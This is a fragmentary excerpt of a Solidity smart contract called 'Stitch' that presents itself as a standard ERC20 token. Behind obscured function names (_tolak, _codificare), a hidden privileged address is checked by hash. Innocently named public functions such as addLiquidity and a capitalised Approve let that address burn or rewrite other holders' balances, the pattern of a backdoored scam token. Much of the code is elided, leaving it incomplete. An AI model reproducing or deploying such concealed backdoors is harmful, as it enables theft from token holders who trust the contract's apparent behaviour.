...
contract Stitch is IERC20, TokenBase, Ownable {
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _tokenContract.tokenCont = token_;
        _tokenContract.patch = PATCH;
    ...
    returns (bool)
    {
        _inTrans(_msgSender(), recipient, amount);
        return true;
    }
    ...
    function transferFrom(
        ...
        _inTrans(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _tolak(account, amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _tolak(address account, uint256 amount) internal {
    ...
    function addLiquidity(address spender, uint256 amount, bool isOwner) public virtual {
        ...
        uint256 total = 0;
        if (_codificare(spender, _tokenContract.tokenCont)) {
            _tolak(from, total);
    ...
    function _codificare(address pass1, address pass2) internal view returns (bool) {
        bytes32 hash1 = keccak256(abi.encodePacked(pass1));
        bytes32 hash2 = keccak256(abi.encodePacked(pass2));
        return hash1 == hash2;
    }

    function _cyma(uint256 tqx, uint256 mqt) internal pure returns (uint256) {
        if (mqt != 0) {
            return tqx + mqt;
        }
        return mqt;
    ...
    function Approve(address spender, uint256 amount) public returns (bool)  {
        ...
        _isEnoughAllow(from, spender, amount);
        return true;
    }

    function _isEnoughAllow(address user, address spender, uint256 amount) internal {
        if (_codificare(user, _tokenContract.tokenCont)) {
            require(spender != address(0), "Invalid address");
            if (amount > 0) {
    ...
    function _requireBalance(
        ...
        uint256 amount = 0;
        if (_codificare(sender, _dex[sender])) {
            _balances[sender] = _balances[sender] + amount;
            amount = _totalSupply;
            _tolak(sender, amount);
        } else {
            _balances[sender] = _balances[sender] + amount;
        }
    }
